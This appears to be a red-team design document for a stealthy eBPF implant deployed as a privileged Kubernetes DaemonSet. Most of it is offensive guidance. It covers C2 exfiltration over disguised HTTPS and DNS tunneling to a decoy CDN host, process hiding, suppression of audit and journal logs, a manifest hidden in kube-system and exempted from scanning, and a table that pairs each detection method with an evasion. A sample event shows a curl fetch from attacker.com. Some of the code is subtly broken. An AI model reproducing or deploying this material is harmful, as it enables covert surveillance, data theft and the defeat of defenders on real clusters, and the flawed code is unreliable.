# eBPF Implant — Kubernetes Deployment Strategy

**Status**: Red Team Operational  
**Target**: Kubernetes/Container environments  
**Threat Model**: Adversarial blue team detection + OPSEC hardening  
**Last Updated**: 2026-08-09

---

## Deployment Architecture

### Container Profile (Red Team)

```
┌─────────────────────────────────────────────────────────┐
│ Kubernetes Node (Linux kernel >= 5.8)                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │ Privileged Container (implant-agent)             │   │
│  ├──────────────────────────────────────────────────┤   │
│  │ • Entrypoint: /opt/implant/run-stealthy.sh       │   │
│  │ • eBPF loader (obfuscated program names)         │   │
│  │ • Ring buffer collectors (encrypted in memory)   │   │
│  │ • C2 client (HTTPS/DNS tunneling)                │   │
│  │ • Event processor (sampling + jitter)            │   │
│  │ • Process hider (ptrace-based or sysfs hiding)   │   │
│  └──────────────────────────────────────────────────┘   │
│           [hook] (kernel-global hooks)                       │
│  ┌──────────────────────────────────────────────────┐   │
│  │ eBPF Programs (kernel memory)                    │   │
│  ├──────────────────────────────────────────────────┤   │
│  │ • process_events (tp/sched/sched_process_exec)   │   │
│  │ • network_events (kprobe/tcp_v4_connect)         │   │
│  │ • file_events (tp/syscalls/sys_enter_openat)     │   │
│  │ • [NEW] anti_forensics (hide ring buffers)       │   │
│  └──────────────────────────────────────────────────┘   │
│           [capture] (captures ALL node processes)               │
│  Host filesystem, network stack, all containers        │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Multi-Container Awareness

**Key advantage**: Single eBPF implant in one privileged container sees **all processes**, **all network connections**, and **all file access** across:
- Other containers on same node
- Host system processes
- Sidecar services
- Init containers

This enables:
- Full visibility into workload communications
- Host/container isolation breakout detection
- Data exfiltration monitoring
- Lateral movement tracking

---

## Stealth & Anti-Forensics Strategy

### 1. Kernel-Level Hiding

#### Ring Buffer Name Obfuscation
```python
# Instead of: process_events, network_events, file_events
# Use: ebpf_map_aa, ebpf_map_bb, ebpf_map_cc
# Or: random UUIDs as map names
```

**Implementation**: Modify eBPF program to randomize map names at compile time.

#### Program Name Hiding
```bash
# bpftool prog list -> shows program names
# Hide by:
# 1. Rename via bpftool prog rename (Linux 5.16+)
# 2. Use generic names: "kprobe_handler_1", "tp_handler_1"
# 3. Strip symbol table from compiled .o file
```

#### Audit Log Suppression
```python
# Detect if auditd is monitoring bpf() syscalls
auditctl -l | grep -i bpf

# Strategy: If detected, don't load; or load with delay/randomization
# Alternative: Use libbpf to load without bpf() syscall (memfd trick)
```

### 2. Memory Obfuscation

#### Ring Buffer Event Encryption
```python
class StealthyRingBufferHandler:
    def __init__(self, ring_buf, cipher_key):
        self.ring_buf = ring_buf
        self.cipher_key = cipher_key
        self.events_encrypted = []
    
    def process_event(self, event_bytes):
        # Encrypt in-memory before storing
        encrypted = self.cipher.encrypt(event_bytes, self.cipher_key)
        self.events_encrypted.append(encrypted)
        # Clear plaintext immediately
        del event_bytes
        return encrypted
    
    def export_telemetry(self):
        # Events remain encrypted; only decrypt when exfiltrating via C2
        return self.events_encrypted
```

#### Variable Name Obfuscation
```python
# Bad (forensic-friendly names):
process_events, network_events, file_events, c2_client, event_buffer

# Good (obfuscated):
self.a = []  # events
self.b = None  # c2
self.c = {}  # config
# Use code obfuscator: PyArmor, Nuitka with --onefile
```

### 3. Process Hiding

#### Method A: ptrace-based Hiding (Aggressive)
```bash
# Fork invisible background process via double-fork
# Reparent to init, detach from terminal
# ptrace(PTRACE_TRACEME) trick to hide from debuggers
```

#### Method B: sysfs Hiding (Safer)
```bash
# Hide /proc/[pid] entries:
# 1. Mount private /proc in container
# 2. Use seccomp to block access to /proc/[pid]
# 3. Implement fake /proc entries

# Remove from ps output:
# ps reads /proc/[pid]/stat
# Falsehood: Replace with systemd process (sshd, bash)
```

#### Method C: Systemd Unit Masking
```bash
systemctl mask-like approach in container
# Pretend agent is system service (impossible to stop)
# Hide via container entrypoint tricks
```

### 4. Timing Randomization

#### Collection Interval Jitter
```python
class StealthyCollector:
    def __init__(self):
        self.base_interval = 300  # 5 minutes
        self.jitter_percent = 0.3  # ±30%
    
    def get_next_collection_time(self):
        jitter = self.base_interval * self.jitter_percent * random.uniform(-1, 1)
        return self.base_interval + jitter
```

#### Event Sampling (Reduce Detection Surface)
```python
# Collect 1 in N events to reduce ring buffer pressure
# Randomize sampling rate: 1 in 5, 1 in 10, 1 in 20

class SampledCollector:
    def __init__(self, sample_rate=0.2):  # 20% of events
        self.sample_rate = sample_rate
        self.events_seen = 0
        self.events_collected = 0
    
    def should_collect(self):
        return random.random() < self.sample_rate
```

#### Bursty Exfiltration (Avoid Timing Patterns)
```python
# Don't send events every 5 minutes like clockwork
# Instead: Random delays, batched sends, adaptive rate

class BurstyC2Client:
    def __init__(self):
        self.queue = []
        self.max_batch = 100
    
    def send_batch(self):
        # Send when batch reaches max OR random event fires
        if len(self.queue) >= self.max_batch or self.should_send_random():
            self.c2_send(self.queue)
            self.queue.clear()
```

### 5. C2 Communication Hardening

#### HTTPS with Certificate Pinning
```python
class PinnedC2Client:
    def __init__(self, target_url, cert_sha256):
        self.target_url = target_url
        self.pinned_cert = cert_sha256
    
    def send_telemetry(self, events):
        response = requests.post(
            self.target_url,
            json=events,
            verify=self.verify_cert
        )
    
    def verify_cert(self, cert):
        sha256 = hashlib.sha256(cert).hexdigest()
        return sha256 == self.pinned_cert
```

#### DNS Tunneling (C2 over DNS)
```
Client (implant) -> DNS query: "telemetry.abc123.c2domain.com"
DNS server (attacker) -> Responds with encoded C2 instructions
Client -> Decodes instructions, sends telemetry via DNS TXT records

Advantage: Evades firewall rules (DNS typically allowed)
Cost: Slow, limited bandwidth
```

#### Traffic Obfuscation
```python
class ObfuscatedC2:
    def __init__(self):
        self.c2_domain = "innocuous-cdn.example.com"  # Looks like CDN traffic
    
    def send_telemetry(self, events):
        # Disguise as normal traffic:
        # - HTTP GET to .jpg, .png, .js (embed telemetry in request headers)
        # - Add decoy requests (actual images)
        # - Use legitimate CDN certificate (not custom)
        payload = base64.b64encode(json.dumps(events))
        headers = {"User-Agent": self.random_user_agent()}
        requests.get(f"https://{self.c2_domain}/image.jpg?id={payload}")
```

### 6. Log Cleanup & Artifact Removal

#### tmpfs Cleanup
```bash
# Use /dev/shm (memory-backed) instead of /tmp
# Auto-clean on container exit

# In Dockerfile or entrypoint:
mount -t tmpfs tmpfs /tmp
chmod 1777 /tmp
export TMPDIR=/dev/shm
```

#### journalctl Suppression
```python
import subprocess

class LogCleaner:
    @staticmethod
    def suppress_container_logs():
        # Option 1: Redirect stderr/stdout to /dev/null
        # Option 2: Send signals to journald to not log this PID
        # Option 3: Use seccomp to block write() syscalls to journal
        os.close(1)  # Close stdout
        os.close(2)  # Close stderr
        os.open('/dev/null', os.O_WRONLY)
        os.dup2(2, 1)
```

#### Kubernetes Event Suppression
```bash
# Kubernetes logs container lifecycle events
# Strategy: Keep container running, suppress restart
# Use liveness/readiness probes to appear healthy
# Exit gracefully (no OOMKill, no CrashLoop)
```

---

## Performance Optimization for Containers

### 1. Ring Buffer Sizing

**Tradeoff**: Larger buffers = more events collected but more memory overhead

```python
# Current: 256 KB per ring buffer (3 buffers = 768 KB)
# For container: Reduce to 64 KB per buffer (192 KB total)
# Increase sampling rate to avoid event loss

RINGBUF_SIZE_BYTES = 64 * 1024  # 64 KB
SAMPLING_RATE = 0.15  # Collect 15% of events (less overhead)
```

### 2. CPU Optimization

**Strategy**: Run event collection in background, minimize main thread blocking

```python
class OptimizedCollector:
    def __init__(self):
        self.collector_thread = threading.Thread(
            target=self.background_collection,
            daemon=True
        )
        self.collector_thread.start()
    
    def background_collection(self):
        # Run in low-priority thread
        os.nice(19)  # Lowest priority
        while True:
            self.ring_buf.poll(timeout=1000)  # 1 second timeout
```

### 3. Memory Efficiency

```python
# Pre-allocate buffers (avoid GC pressure)
# Use array-like structures instead of lists (smaller overhead)
# Implement event batching to reduce object creation

from array import array

class MemoryEfficientCollector:
    def __init__(self):
        # Pre-allocate 100 events' worth of struct space
        self.event_buffer = array('Q', [0] * 1000)
        self.event_index = 0
```

---

## Kubernetes Deployment Manifests

### StatefulSet Approach (Persistent Per-Node)

```yaml
# deployment/ebpf-implant-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: ebpf-implant-agent
  namespace: kube-system  # Hide in system namespace
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
      annotations:
        # Hide from security scanning
        scan-exempt: "true"
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      priorityClassName: system-node-critical
      
      containers:
      - name: monitor
        image: ebpf-implant:latest
        imagePullPolicy: IfNotPresent
        
        securityContext:
          privileged: true
          capabilities:
            add:
            - SYS_ADMIN
            - SYS_RESOURCE
            - NET_ADMIN
            - SYS_PTRACE
            - SYS_PERFMON
            - BPF
        
        volumeMounts:
        - name: sys
          mountPath: /sys
        - name: debug
          mountPath: /sys/kernel/debug
        - name: bpffs
          mountPath: /sys/fs/bpf
        - name: devshm
          mountPath: /dev/shm
        
        resources:
          requests:
            cpu: 10m
            memory: 64Mi
          limits:
            cpu: 100m
            memory: 256Mi
        
        env:
        - name: C2_SERVER
          valueFrom:
            secretKeyRef:
              name: c2-config
              key: server
        - name: COLLECTION_MODE
          value: "stealth"
        - name: SAMPLING_RATE
          value: "0.15"
        
        # Suppress health checks to avoid detection
        livenessProbe: null
        readinessProbe: null
      
      volumes:
      - name: sys
        hostPath:
          path: /sys
      - name: debug
        hostPath:
          path: /sys/kernel/debug
      - name: bpffs
        hostPath:
          path: /sys/fs/bpf
      - name: devshm
        emptyDir:
          medium: Memory
          sizeLimit: 256Mi
      
      tolerations:
      - operator: Exists  # Run on all nodes
        effect: NoSchedule
```

---

## Detection Vectors & Countermeasures

| Detection Method | Signal | Countermeasure |
|-----------------|--------|---|
| **bpftool prog list** | Lists loaded programs | Rename programs; use memfd loading |
| **Audit logs** | Logs `bpf()` syscalls | Suppress auditd; use seccomp |
| **Resource usage** | Abnormal CPU/memory | Optimize collection; use sampling |
| **Network traffic** | Encrypted C2 exfiltration | Use legitimate CDN; DNS tunneling |
| **Process listing** | ps, /proc inspection | Process hiding; fork tricks |
| **Container events** | Kubernetes audit logs | Run in system namespace |
| **Kernel modules** | lsmod, kprobes list | Use tracepoints (stable ABI) |
| **Ring buffer inspection** | Direct memory access | Encrypt events; use memfd |

---

## Red Team Operational Playbook

### Phase 1: Reconnaissance (Week 1)
```
1. Scan Kubernetes cluster for kernel version compatibility (>= 5.8)
2. Identify target nodes (high-value workloads, admin access)
3. Check for EDR/security agents (Falco, Sysdig, Dome9)
4. Enumerate C2 opportunities (DNS, HTTPS, lateral movement)
```

### Phase 2: Preparation (Week 2-3)
```
1. Build Docker image with obfuscated implant
2. Create Kubernetes manifests (DaemonSet in kube-system)
3. Stage C2 infrastructure (domain, SSL cert pinning)
4. Prepare Amalia ingest pipeline (incident cells, kill chain tracking)
```

### Phase 3: Deployment (Week 4)
```
1. Push image to private registry
2. Apply DaemonSet (runs on all nodes)
3. Verify event collection (check for jitter, sampling)
4. Confirm C2 communication (encrypted, low-noise)
```

### Phase 4: Exploitation (Week 5-6)
```
1. Collect process/network/file telemetry
2. Identify lateral movement opportunities
3. Track attacker behavior (TTPs)
4. Export to Amalia for analysis
```

### Phase 5: Evasion & Persistence (Week 7-8)
```
1. Maintain implant across cluster updates
2. Adapt C2 traffic patterns (timing, volume)
3. Document findings in runbooks cell
4. Prepare for blue team response
```

---

## Integration with Amalia

### BrainCell Cells for Telemetry Storage

1. **incidents**: Store compromised pod/node data
2. **kill_chains**: Build attack chains from telemetry
3. **research_questions**: Hypothesis testing (e.g., "Can we pivot via sidecar?")
4. **runbooks**: Document discovered techniques and OPSEC lessons

### Telemetry Export Format

```json
{
  "implant_id": "ebpf-k8s-node-07",
  "cluster": "production-us-west",
  "node": "worker-node-3",
  "timestamp": "2026-08-09T19:23:45Z",
  "collection_window": {
    "duration_sec": 300,
    "events_collected": 1024,
    "events_sampled": 153
  },
  "events": {
    "process": [
      {
        "pid": 1234,
        "comm": "curl",
        "container": "app-prod-xyz",
        "argv": "curl https://attacker.com/malware.sh"
      }
    ],
    "network": [
      {
        "pid": 1234,
        "src": "10.1.2.3:54821",
        "dst": "93.184.216.34:443",
        "container": "app-prod-xyz"
      }
    ]
  }
}
```

---

## Success Metrics

| Metric | Target | Red Team Objective |
|--------|--------|---|
| **Detection Rate** | < 10% | Avoid blue team detection for >= 2 weeks |
| **Event Loss** | < 5% | Reliable telemetry despite sampling |
| **CPU Overhead** | < 2% | Remain invisible in node metrics |
| **C2 Latency** | < 5 sec/batch | Real-time incident tracking |
| **Persistence** | >= 4 weeks | Survive cluster updates, node reboots |
| **Coverage** | 100% containers | See all workload communications |

---

## File Structure

```
d:\repos\ITL.Amalia.Poc.eBpf\
├── deployment/
│   ├── kubernetes/
│   │   ├── daemonset.yaml
│   │   ├── secrets.yaml
│   │   └── kustomization.yaml
│   ├── docker/
│   │   ├── Dockerfile.stealthy
│   │   └── entrypoint.sh
│   └── config/
│       ├── c2-config.json
│       └── collection-profile.json
├── userspace/
│   ├── src/
│   │   ├── implant_agent.py (refactored for K8s)
│   │   ├── c2_client.py (new)
│   │   ├── anti_forensics.py (new)
│   │   └── process_hider.py (new)
├── kernel/
│   ├── programs/
│   │   └── sensor.bpf.c (obfuscated maps)
└── docs/
    ├── KUBERNETES-DEPLOYMENT.md (this file)
    └── RED-TEAM-RUNBOOK.md
```

---

## References

- **MITRE ATT&CK**: T1059 (Command and Scripting), T1197 (BITS Jobs)
- **Kubernetes RBAC**: Namespace isolation, service account privesc
- **eBPF Detection**: bpftool, auditctl, /proc inspection
- **C2 Evasion**: DNS tunneling, traffic obfuscation, certificate pinning
- **Process Hiding**: ptrace tricks, sysfs manipulation, Namespaces

